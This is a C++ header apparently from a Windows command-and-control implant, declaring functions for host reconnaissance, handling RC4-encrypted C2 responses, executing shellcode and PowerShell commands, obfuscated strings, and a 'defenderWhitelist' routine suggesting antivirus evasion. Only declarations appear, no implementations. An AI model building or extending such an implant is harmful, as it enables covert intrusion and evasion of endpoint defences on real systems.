#pragma once
#ifndef __CORE_H__
#define __CORE_H__
#include <Windows.h>
#include <tlhelp32.h>
#include <Lmcons.h>
#include <string>
#include <sstream>
#include <iostream>
#include "base64.h"
#include "Utilities.h"
#include "XorString.h"
#include "cryptopp/secblock.h"

std::string GetCurrentComputerName();

std::string GetCurrentUserName();

std::string GetPID();

std::string IsDebugPrivilege(int pid);

SYSTEM_INFO GetSysInfo();

void HandleC2Response(std::string encrypted_comms_data, int* sleep_time, std::string* session_id, CryptoPP::SecByteBlock* rc4Key);

typedef struct DataPointers Struct;

Struct findDataPointers(std::string sessionID, std::string comms_data);

std::string GetSMSysInfo();

int ExecShellcodeTesting();

void ExecutePowerShellCmd(std::string command);

std::string defenderWhitelist();

#endif
